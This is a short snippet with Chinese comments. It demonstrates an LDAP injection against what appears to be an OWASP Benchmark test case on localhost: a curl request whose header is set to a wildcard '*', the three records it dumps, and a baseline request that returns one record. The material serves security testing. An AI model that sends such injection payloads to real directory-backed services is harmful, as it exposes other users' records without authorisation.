# 基础注入：通配符匹配所有 uid
curl -H "BenchmarkTest00505: *" http://127.0.0.1:8443/benchmark/ldapi-00/BenchmarkTest00505

# 返回全部3条记录，证明过滤器被操纵
# 响应示例：
# LDAP query results:<br>Record found with name foo<br>Address: AddressForFoo #345<br>
# LDAP query results:<br>Record found with name Mr Unknown<br>Address: Whe home is #678<br>
# LDAP query results:<br>Record found with name MS Bar<br>Address: The streetz 4 Ms bar<br>

# 正常请求（基准对比）：
curl http://127.0.0.1:8443/benchmark/ldapi-00/BenchmarkTest00505
# 仅返回 1 条记录：MS Bar